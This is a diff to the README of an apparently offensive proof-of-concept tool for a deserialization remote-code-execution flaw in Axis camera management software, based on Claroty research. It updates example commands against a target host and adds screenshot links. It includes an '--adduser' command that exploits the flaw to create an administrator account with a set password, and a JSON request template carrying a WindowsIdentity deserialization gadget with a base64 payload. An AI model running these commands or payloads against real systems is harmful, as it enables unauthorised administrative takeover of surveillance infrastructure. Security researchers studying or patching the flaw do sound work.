@@ -17,8 +17,6 @@ It is based on Claroty's blog ["Turning Camera Surveillance on its Axis"](https:
 python3 main.py --host <TARGET_IP> --key <CLIENT_PRIVATE_KEY.pem> [OPTIONS]
 ```
 
-
-
 | Flag             | Description |
 |------------------|-------------|
 | `--host`         | Target IP/host (**required**). |
@@ -34,28 +32,29 @@ python3 main.py --host <TARGET_IP> --key <CLIENT_PRIVATE_KEY.pem> [OPTIONS]
 
 ### Examples
 
-Handshake only, then dump the initial channel frames:
-
-```bash
-python3 main.py --host 10.0.0.5 --key client_priv.pem
-```
-
 Query the product version:
 
 ```bash
-python3 main.py --host 10.0.0.5 --key client_priv.pem --version
+python3 main.py --host 192.168.1.197 --port 55752 --key client_priv.pem --version
 ```
+
+![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/axis_rce/Screenshot_1.jpg)
 
 Exploit the deserialization to create an administrator user "ricardo" with password "ThisIsIt123":
 
+
 ```bash
-python3 main.py --host 10.0.0.5 --key client_priv.pem --adduser
+python3 main.py --host 192.168.1.197 --port 55752 --key client_priv.pem --adduser
 ```
+
+![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/axis_rce/Screenshot_2.jpg)
+
+![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/axis_rce/Screenshot_3.jpg)
 
 Send a custom Request from a file:
 
 ```bash
-python3 main.py --host 10.0.0.5 --key client_priv.pem --json my_request.json
+python3 main.py --host 192.168.1.197 --port 55752 --key client_priv.pem --json my_request.json
 ```
 
 <br>
@@ -71,7 +70,7 @@ A Request is a JSON object with a single `Request` key. The format to exploit th
         "Service": "SessionFacade",
         "Method": "LogOnAsync",
         "Parameters": {
-            "uri": "http://10.0.0.5:55752/",
+            "uri": "http://192.168.1.197:55752/",
             "clientInformationDto": {
                 "$type": "System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                 "System.Security.ClaimsIdentity.actor": "AAEAAAD/////AQAAAAAAAAA..."
